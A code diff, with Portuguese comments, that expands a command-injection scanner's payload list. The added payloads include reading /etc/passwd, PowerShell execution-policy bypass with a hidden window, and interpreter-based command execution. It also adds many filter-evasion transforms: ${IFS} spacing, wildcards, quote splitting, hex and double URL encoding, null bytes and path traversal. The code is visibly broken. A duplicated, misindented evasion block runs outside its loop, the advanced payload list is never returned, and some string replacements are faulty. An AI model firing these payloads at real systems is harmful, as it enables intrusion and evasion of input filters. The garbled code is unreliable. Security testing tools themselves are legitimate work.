@@ -36,69 +36,218 @@ class CommandInjectionScanner:
         self.console = Console()
 
     def _get_default_payloads(self):
-        """Retorna payloads de Command Injection padrão."""
-        return [
+        """Retorna payloads de Command Injection padrão com técnicas de evasão avançadas."""
+        base_payloads = [
             # Unix/Linux commands
-            "; whoami",
-            "&& whoami", 
-            "| whoami",
-            "; id",
-            "&& id",
-            "| id",
-            "; uname -a",
-            "&& uname -a",
-            "| uname -a",
-            "; cat /etc/passwd",
-            "&& cat /etc/passwd",
-            "| cat /etc/passwd",
-            "; ls -la",
-            "&& ls -la", 
-            "| ls -la",
-            "`whoami`",
-            "$(whoami)",
-            "`id`",
-            "$(id)",
-            "`uname -a`",
-            "$(uname -a)",
+            "; whoami", "&& whoami", "| whoami",
+            "; id", "&& id", "| id",
+            "; uname -a", "&& uname -a", "| uname -a",
+            "; cat /etc/passwd", "&& cat /etc/passwd", "| cat /etc/passwd",
+            "; ls -la", "&& ls -la", "| ls -la",
+            "`whoami`", "$(whoami)", "`id`", "$(id)", "`uname -a`", "$(uname -a)",
+            
             # Windows commands
-            "; dir",
-            "&& dir",
-            "| dir",
-            "; whoami",
-            "&& whoami",
-            "| whoami",
-            "; systeminfo",
-            "&& systeminfo",
-            "| systeminfo",
-            "; ipconfig",
-            "&& ipconfig",
-            "| ipconfig",
-            "; net user",
-            "&& net user",
-            "| net user",
+            "; dir", "&& dir", "| dir",
+            "; whoami", "&& whoami", "| whoami",
+            "; systeminfo", "&& systeminfo", "| systeminfo",
+            "; ipconfig", "&& ipconfig", "| ipconfig",
+            "; net user", "&& net user", "| net user",
+            
             # Time-based detection
-            "; sleep 5",
-            "&& sleep 5",
-            "| sleep 5",
-            "; ping -c 5 127.0.0.1",
-            "&& ping -c 5 127.0.0.1",
-            "| ping -c 5 127.0.0.1",
-            # Windows time-based
-            "; timeout 5",
-            "&& timeout 5",
-            "| timeout 5",
-            "; ping -n 5 127.0.0.1",
-            "&& ping -n 5 127.0.0.1",
-            "| ping -n 5 127.0.0.1",
-            # Encoding variations
-            "%3B%20whoami",
-            "%26%26%20whoami",
-            "%7C%20whoami",
-            # Null byte injection
-            "; whoami%00",
-            "&& whoami%00",
-            "| whoami%00"
+            "; sleep 5", "&& sleep 5", "| sleep 5",
+            "; ping -c 5 127.0.0.1", "&& ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1",
+            "; timeout 5", "&& timeout 5", "| timeout 5",
+            "; ping -n 5 127.0.0.1", "&& ping -n 5 127.0.0.1", "| ping -n 5 127.0.0.1"
         ]
+        
+        # Técnicas de evasão avançadas
+        evasion_techniques = []
+        
+        for payload in base_payloads[:20]:  # Aplicar evasões aos primeiros 20 payloads principais
+            # 1. URL Encoding
+            evasion_techniques.append(payload.replace(";", "%3B").replace("&", "%26").replace("|", "%7C").replace(" ", "%20"))
+            
+            # 2. Double URL Encoding
+            evasion_techniques.append(payload.replace(";", "%253B").replace("&", "%2526").replace("|", "%257C").replace(" ", "%2520"))
+            
+            # 3. Unicode Encoding
+            evasion_techniques.append(payload.replace(";", "\\u003B").replace("&", "\\u0026").replace("|", "\\u007C"))
+            
+            # 4. Hex Encoding
+            evasion_techniques.append(payload.replace(" ", "\\x20").replace(";", "\\x3B").replace("&", "\\x26"))
+            
+            # 5. Case Variations (para Windows)
+            if "dir" in payload.lower() or "whoami" in payload.lower():
+                evasion_techniques.append(payload.replace("dir", "DiR").replace("whoami", "WhOaMi"))
+            
+            # 6. Alternative separators
+            evasion_techniques.append(payload.replace(";", "&&"))
+            evasion_techniques.append(payload.replace("&&", ";"))
+            evasion_techniques.append(payload.replace("|", "&&"))
+            
+            # 7. Null byte injection
+            evasion_techniques.append(payload + "%00")
+            evasion_techniques.append(payload + "\\x00")
+            
+            # 8. Comment injection
+            evasion_techniques.append(payload + "#")
+            evasion_techniques.append(payload + "/*")
+            
+            # 9. Space alternatives
+            evasion_techniques.append(payload.replace(" ", "\t"))
+            evasion_techniques.append(payload.replace(" ", "${IFS}"))
+            evasion_techniques.append(payload.replace(" ", "$IFS"))
+            evasion_techniques.append(payload.replace(" ", "<"))
+            
+            # 10. Concatenation techniques
+            if "whoami" in payload:
+                evasion_techniques.append(payload.replace("whoami", "who'ami"))
+                evasion_techniques.append(payload.replace("whoami", "who\"ami"))
+                evasion_techniques.append(payload.replace("whoami", "who$'ami'"))
+                evasion_techniques.append(payload.replace("whoami", "wh\\oami"))
+                
+            # 11. Alternative command forms
+            if "cat" in payload:
+                evasion_techniques.append(payload.replace("cat", "ca\\t"))
+                evasion_techniques.append(payload.replace("cat", "c'a't"))
+                evasion_techniques.append(payload.replace("cat", "c\"a\"t"))
+                
+            # 12. Variable expansion
+            evasion_techniques.append(payload.replace("whoami", "${HOME%/*}/bin/whoami"))
+            evasion_techniques.append(payload.replace("id", "/usr/bin/i\\d"))
+            
+            # 13. Backtick vs $() variations
+            if "`" in payload:
+                evasion_techniques.append(payload.replace("`", "$(").replace("`", ")"))
+            elif "$(" in payload:
+                evasion_techniques.append(payload.replace("$(", "`").replace(")", "`"))
+                
+            # 14. Wildcard obfuscation
+            evasion_techniques.append(payload.replace("whoami", "w*ami"))
+            evasion_techniques.append(payload.replace("whoami", "who?mi"))
+            evasion_techniques.append(payload.replace("id", "i?"))
+            
+            # 15. Environment variable abuse
+            evasion_techniques.append(payload.replace("whoami", "$USER"))
+            evasion_techniques.append(payload.replace("id", "$UID"))
+        
+        # Técnicas específicas avançadas
+        advanced_payloads = [
+            # Bash-specific evasions
+            "; ${PATH%%/usr*}/whoami",
+            "; $(echo 'whoami')",
+            "; echo $(whoami)",
+            "; w'h'o'a'm'i",
+            "; wh\\o\\am\\i",
+            "; who$@ami",
+            "; ${HOME%/*}/bin/whoami",
+            "; /???/???/whoami",
+            "; /???/bin/i?",
+            
+            # PowerShell-specific evasions (Windows)
+            "; powershell -c whoami",
+            "; powershell.exe -w hidden -c whoami",
+            "; powershell -ep bypass -c whoami",
+            "; pwsh -c whoami",
+            "&& cmd /c whoami",
+            "&& cmd.exe /c dir",
+            
+            # Alternative execution methods
+            "; perl -e 'system(\"whoami\")'",
+            "; python -c 'import os; os.system(\"whoami\")'",
+            "; ruby -e 'system(\"whoami\")'",
+            "; php -r 'system(\"whoami\");'",
+            "; node -e 'require(\"child_process\").exec(\"whoami\")'",
+            
+            # File-based techniques
+            "; echo whoami > /tmp/cmd; sh /tmp/cmd",
+            "; echo 'whoami' | sh",
+            "; echo whoami | /bin/bash",
+            
+            # Redirection abuse
+            "; whoami < /dev/null",
+            "; whoami > /dev/null",
+            "; whoami 2>&1",
+            "; whoami >&2",
+            
+            # Process substitution
+            "; cat <(whoami)",
+            "; $(< <(echo whoami))",
+            
+            # ANSI-C Quoting
+            "; $'\\x77\\x68\\x6f\\x61\\x6d\\x69'",  # whoami in hex
+            "; $'who\\ami'",
+            
+            # Here documents
+            "; cat << EOF | sh\\nwhoami\\nEOF",
+            
+            # Logic operators
+            "; true && whoami",
+            "; false || whoami",
+            "; whoami && true",
+            "; whoami || false",
+            
+            # Arithmetic expansion
+            "; $((1)) && whoami",
+            "; let 1 && whoami"
+        ]
+            
+            # 10. Command substitution variations
+        if "`" in payload:
+                evasion_techniques.append(payload.replace("`", "$(").replace("`", ")"))
+            
+            # 11. Concatenation techniques
+        if "whoami" in payload:
+                evasion_techniques.append(payload.replace("whoami", "who''ami"))
+                evasion_techniques.append(payload.replace("whoami", "who\"\"ami"))
+                evasion_techniques.append(payload.replace("whoami", "wh\\oami"))
+            
+            # 12. Environment variable injection
+        evasion_techniques.append(payload.replace("whoami", "$0ami" if "whoami" in payload else payload))
+            
+            # 13. Wildcard evasion
+        if "cat" in payload:
+                evasion_techniques.append(payload.replace("cat", "c?t"))
+                evasion_techniques.append(payload.replace("cat", "c*t"))
+            
+            # 14. Path traversal combined
+        evasion_techniques.append(payload.replace("/etc/passwd", "../../../etc/passwd"))
+        evasion_techniques.append(payload.replace("/etc/passwd", "....//....//....//etc/passwd"))
+            
+            # 15. Alternative commands
+        if "whoami" in payload:
+                evasion_techniques.append(payload.replace("whoami", "id -un"))
+                evasion_techniques.append(payload.replace("whoami", "echo $USER"))
+            
+            # 16. Arithmetic expansion
+        evasion_techniques.append(payload.replace("5", "$((5))"))
+        evasion_techniques.append(payload.replace("5", "$[5]"))
+            
+            # 17. Process substitution
+        if "cat" in payload:
+                evasion_techniques.append(payload.replace("cat /etc/passwd", "< /etc/passwd"))
+            
+            # 18. ANSI-C Quoting
+        evasion_techniques.append(payload.replace("whoami", "$'whoami'"))
+            
+            # 19. Brace expansion
+        evasion_techniques.append(payload.replace("whoami", "{whoami}"))
+            
+            # 20. Variable indirection
+        evasion_techniques.append(payload.replace("whoami", "${!#}whoami"))
+        
+        # Combinar payloads base com técnicas de evasão
+        all_payloads = base_payloads + evasion_techniques
+        
+        # Remover duplicatas mantendo ordem
+        seen = set()
+        unique_payloads = []
+        for payload in all_payloads:
+            if payload not in seen:
+                seen.add(payload)
+                unique_payloads.append(payload)
+        
+        return unique_payloads
 
     def _detect_command_execution(self, response_text, payload):
         """Detecta evidências de execução de comandos."""
